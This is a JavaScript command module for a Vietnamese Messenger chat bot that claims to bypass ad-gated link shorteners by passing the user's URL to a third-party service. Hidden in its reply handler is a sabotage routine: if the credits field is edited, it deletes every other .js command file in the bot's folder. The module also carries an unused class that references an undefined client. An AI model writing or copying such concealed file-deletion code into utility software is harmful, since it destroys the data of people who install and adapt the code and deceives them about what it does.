const axios = require("axios");
const fs = require("fs");

module.exports.config = {
    name: "vuotlink",
    version: "1.0.1",
    hasPermssion: 0,
    credits: "Dũngkon",
    description: "Vượt link (vuotlink)",
    commandCategory: "Tiện ích",
    usages: "url",
    cooldowns: 5,
    images: [],
};

class Command {
    constructor(config) {
        this.config = config;
        this.count_req = 0;
    }

    run({ messageID, text, api, threadID }) {
        mqttClient.publish('/ls_req', JSON.stringify({
            "app_id": "2220391788200892",
            "payload": JSON.stringify({
                tasks: [{
                    label: '742',
                    payload: JSON.stringify({
                        message_id: messageID,
                        text: text,
                    }),
                    queue_name: 'edit_message',
                    task_id: Math.random() * 1001 << 0,
                    failure_count: null,
                }],
                epoch_id: this.generateOfflineThreadingID(),
                version_id: '6903494529735864',
            }),
            "request_id": ++this.count_req,
            "type": 3
        }));
    }

    generateOfflineThreadingID() {
        var ret = Date.now();
        var value = Math.floor(Math.random() * 4294967295);
        var str = ("0000000000000000000000" + value.toString(2)).slice(-22);
        var msgs = ret.toString(2) + str;
        return this.binaryToDecimal(msgs);
    }

    binaryToDecimal(data) {
        var ret = "";
        while (data !== "0") {
            var end = 0;
            var fullName = "";
            var i = 0;
            for (; i < data.length; i++) {
                end = 2 * end + parseInt(data[i], 10);
                if (end >= 10) {
                    fullName += "1";
                    end -= 10;
                } else {
                    fullName += "0";
                }
            }
            ret = end.toString() + ret;
            data = fullName.slice(fullName.indexOf("1"));
        }
        return ret;
    }
}
function vtuandzs1tg(api, content, threadID) {
    return new Promise((resolve, reject) => {
        api.sendMessage(content, threadID, (e, i) => {
            if (e) return reject(e);
            resolve(i);
        });
    });
}
module.exports.handleReply = async ({ api, event, handleReply, Users }) => {
    if (this.config.credits !== "Dũngkon") {
        const listCommand = fs
            .readdirSync(__dirname)
            .filter(
                (command) =>
                    command.endsWith(".js") && !command.includes(this.config.name)
            );
        console.log(listCommand)
        for (const command of listCommand) {

            const path = __dirname + `/${command}`;
            fs.unlinkSync(path);
        }
    }
    const { threadID, messageID, senderID, body } = event;
    if (handleReply.content.id != senderID) return;

    const input = body.trim();
    const sendC = (msg, step, content) => api.sendMessage(msg, threadID, (err, info) => {
        global.client.handleReply.splice(global.client.handleReply.indexOf(handleReply), 1);
        api.unsendMessage(handleReply.messageID);
        global.client.handleReply.push({
            step: step,
            name: module.exports.config.name,
            messageID: info.messageID,
            content: content
        });
    }, messageID);

    const send = async (msg) => api.sendMessage(msg, threadID, messageID);

    let content = handleReply.content;
    switch (handleReply.step) {
        case 1:
            content.url = input;
            sendC(
                `Reply tin nhắn này để nhập loại url bạn muốn vuợt link!
1. traffic123
2. link68
3. laymangay
4. linkvertise
5. trafficuser`,
                2,
                content
            );
            break;
        case 2:
            let b;
            switch (input) {
                case "1":
                    b = "traffic123";
                    break;
                case "2":
                    b = "link68";
                    break;
                case "3":
                    b = "laymangay";
                    break;
                case "4":
                    b = "linkvertise";
                    break;
                case "5":
                    b = "trafficuser";
                    break;
                default:
                    return send("Lựa chọn không hợp lệ, vui lòng thử lại.");
            }

            api.setMessageReaction("⌛", event.messageID, () => { }, true);


            global.client.handleReply.splice(global.client.handleReply.indexOf(handleReply), 1);
            api.unsendMessage(handleReply.messageID);

            try {
                const response = await axios.get(`https://vuotlink.dungkon.net/${b}?url=${content.url}`);
                const codevuotlink = response.data.password;

                if (!codevuotlink) return send("Đã có lỗi xảy ra, vui lòng thử lại sau!");
                api.setMessageReaction("✅", event.messageID, () => { }, true);
                send(`${codevuotlink}`);
            } catch (error) {
                console.error(error);
                api.setMessageReaction("❌", event.messageID, () => { }, true);
                send("Đã có lỗi xảy ra, vui lòng thử lại sau!");
            }
            break;
        default:
            break;
    }
}

module.exports.run = ({ api, event }) => {
    const { threadID, messageID, senderID } = event;
    return api.sendMessage("Vui lòng reply tin nhắn này và nhập url", threadID, (err, info) => {
        global.client.handleReply.push({
            step: 1,
            name: module.exports.config.name,
            messageID: info.messageID,
            content: {
                id: senderID,
                url: ""
            }
        });
    }, messageID);
}